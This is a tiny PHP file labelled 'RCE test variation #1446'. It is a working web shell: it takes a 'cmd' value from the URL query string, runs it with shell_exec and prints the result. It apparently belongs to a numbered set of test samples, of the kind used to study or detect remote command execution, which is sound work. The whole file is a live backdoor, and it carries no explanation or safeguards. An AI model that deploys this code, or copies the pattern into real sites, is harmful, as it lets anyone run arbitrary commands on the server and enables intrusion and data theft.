<?php
// RCE test variation #1446
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>